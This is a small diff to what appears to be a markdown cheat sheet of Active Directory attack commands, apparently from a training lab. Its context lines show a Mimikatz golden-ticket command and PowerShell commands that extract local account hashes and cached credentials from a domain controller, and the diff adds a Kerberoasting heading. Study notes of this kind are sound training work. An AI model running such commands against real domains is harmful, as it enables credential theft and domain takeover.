@@ -553,3 +553,5 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose`
 - Retrieve domain cached credentials
   - `Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose`
+
+## Domain Privilege Escalation Kerberoast
